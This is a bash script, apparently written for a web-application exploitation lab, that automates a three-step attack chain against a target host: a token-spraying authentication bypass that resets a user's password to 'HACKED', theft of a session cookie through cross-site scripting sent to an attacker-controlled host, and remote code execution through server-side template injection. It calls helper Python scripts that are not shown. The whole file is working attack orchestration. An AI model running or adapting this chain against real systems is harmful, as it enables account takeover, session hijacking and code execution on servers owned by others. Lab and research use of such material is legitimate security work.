#!/bin/bash

# @title  Token Spray -> XSS -> SSTI
# @author William Moody
# @date   10.03.2021

if [ "$#" -ne 3 ]; then
	echo "usage: $0 TARGET HOST USER"
	exit
fi

new_pass=HACKED
cookie_tmp=.TMPCOOKIEOUTPUT

echo
echo "Step 1 - Authentication Bypass"
echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
echo

python3 token_spray.py $1 $3 $new_pass

echo
echo "Step 2 - Privilege Escalation"
echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
echo

python3 ./steal_cookie.py $1 $2 $3 $new_pass | tee $cookie_tmp
phpsessid=`tail -n 1 $cookie_tmp | awk '{split($0,a,"="); print a[2]}'`
rm $cookie_tmp

echo
echo "Step 3 - RCE"
echo "-=-=-=-=-=-="
echo

python3 ./set_motd.py $1 $2 $phpsessid
